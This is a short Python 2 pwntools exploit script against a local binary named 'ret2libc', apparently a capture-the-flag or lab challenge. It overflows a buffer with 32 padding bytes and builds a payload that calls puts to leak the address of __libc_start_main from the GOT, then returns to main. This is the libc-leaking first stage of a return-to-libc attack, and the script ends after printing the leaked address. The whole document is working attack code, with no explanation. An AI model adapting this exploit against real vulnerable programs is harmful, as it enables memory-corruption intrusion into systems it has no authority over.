from pwn import *

elf = ELF('ret2libc')
libc = ELF('libc.so.6')

libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']
ret = 0x804853a

p = process("./ret2libc")

p.recvline()
binsh_addr = p.recvline().split()[-1][2:-1]
puts_addr = p.recvline().split()[-1][2:-1]

print 'binsh_addr: ' + binsh_addr
print 'puts_addr: ' + puts_addr

payload = flat(['A' * 32, int(puts_addr, 16), main, libc_start_main_got])
print payload
p.sendline(payload)

libc_start_main_addr = u32(p.recv()[:4])

print 'libc_start_main_addr: ' + hex(libc_start_main_addr)
